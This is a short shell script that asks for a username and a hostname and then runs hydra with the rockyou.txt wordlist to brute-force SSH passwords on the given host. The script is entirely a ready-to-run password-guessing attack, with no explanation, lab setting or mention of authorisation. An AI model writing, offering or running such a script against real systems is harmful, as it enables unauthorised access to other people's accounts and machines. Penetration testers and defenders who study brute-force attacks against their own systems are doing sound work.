read -p "input username: " user
read -p "input hostname: " host

hydra -l $user -P rockyou.txt -I -vV ssh://$host
